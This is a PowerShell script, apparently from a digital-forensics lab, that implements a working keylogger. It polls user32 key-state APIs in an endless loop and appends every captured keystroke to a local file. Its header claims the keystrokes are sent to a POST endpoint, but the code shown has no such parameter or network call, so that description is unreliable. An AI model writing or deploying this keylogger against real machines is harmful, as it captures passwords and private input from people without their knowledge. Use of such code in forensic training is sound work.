<# 
.SYNOPSIS 

DFIR Lab 2 script to keylog and send to a target system

.DESCRIPTION

DFIR Lab 2 script keylog and send to a target system
 
.OUTPUTS 
Console and CSV files locally

.PARAMETER Target
	[Required] Full address and location of the POST endpoint you want to target

#> 

#Note that this was primarily built off of an example found online.
$user32 = @'
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
'@
# load the api modules that we need to use
$api = Add-Type -MemberDefinition $user32 -Name 'Win32' -Namespace API -PassThru

$out = New-Item -Path "keylog.txt" -ItemType File -Force
#we use the stopwatch for exfiltratoin to a target host
$stopWatch = [Diagnostics.Stopwatch]::StartNew()
#
# So basically here this is classic Key logging. We simply launch an
# infinite loop and patiently wait a few milliseconds, then grab the
# next keypress and pipe it out to the target 
#
while ($true) {
	Start-Sleep -milliseconds 40 # we want a short time to collect to most recent stroke

	# get all ASCII standard Roman characters
	for ($char = 9; $char -le 254; $char++) {
                $caps_lock = [console]::CapsLock
		$keystate = $api::GetAsyncKeyState($char)
		if ($keystate -eq -32767) {
			$null = [console]::CapsLock
			# translate scan code to real code
			$virtualKey = $api::MapVirtualKey($char, 3)

			# get keyboard state for virtual keys
			$kbstate = New-Object Byte[] 256
			$checkkbstate = $api::GetKeyboardState($kbstate)

			# prepare a StringBuilder to receive input key
			$mychar = New-Object -TypeName System.Text.StringBuilder

			# translate virtual key
			$success = $api::ToUnicode($char, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)

			if ($success) {
				Write-Host $mychar
				Out-File -FilePath "keylog.txt" -Encoding Unicode -Append -InputObject $mychar.ToString()
			}
		}
	}
}